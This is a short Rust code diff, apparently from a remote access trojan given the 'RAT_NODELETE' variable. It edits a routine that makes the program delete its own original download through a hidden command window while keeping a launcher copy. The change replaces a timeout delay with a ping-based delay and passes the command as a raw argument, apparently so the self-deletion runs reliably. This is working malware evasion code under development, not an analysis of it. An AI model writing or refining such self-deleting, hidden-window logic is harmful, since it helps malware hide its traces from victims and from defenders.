@@ -93,11 +93,11 @@ async fn run() -> anyhow::Result<()> {
     // 4. Remove the original download (keep the launcher).
     if !is_launcher && std::env::var_os("RAT_NODELETE").is_none() {
         let cmd = format!(
-            "/C timeout /t 2 /nobreak >nul & del /f /q \"{}\"",
+            "/C ping -n 3 127.0.0.1 >nul & del /f /q \"{}\"",
             self_exe.display()
         );
         let _ = std::process::Command::new("cmd")
-            .arg(cmd)
+            .raw_arg(cmd)
             .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
             .spawn();
         log("self-delete scheduled");
